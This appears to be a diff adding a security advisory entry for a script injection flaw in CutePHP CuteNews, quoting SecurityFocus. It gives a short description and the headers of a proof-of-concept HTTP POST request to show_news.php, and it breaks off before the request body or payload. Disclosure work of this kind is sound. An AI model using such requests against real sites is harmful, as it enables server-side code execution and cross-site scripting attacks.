@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/12691/info
+
+A remote script injection vulnerability affects CutePHP CuteNews. This issue is due to a failure of the application to properly sanitize user-supplied input prior to using it to carry out critical functionality.
+
+An attacker may leverage this issue to inject arbitrary server-side scripts locally and client-side scripts remotely, potentially facilitating code execution with the privileges of the affected Web server and cross-site scripting attacks. 
+
+POST http://localhost/cutenews/show_news.php?subaction=showcomments&id=1108372700&archive=&start_from=&ucat= HTTP/1.1
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Accept-Encoding: gzip,deflate
+Accept-Language: en-us,en;q=0.5
+Host: localhost
+Referer: http://localhost/cutenews/show_news.php?subaction=showcomments&id=1108372700&archive=&start_from=&ucat=
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041111 Firefox/1.0
+Content-Length: 124
+Content-Ty
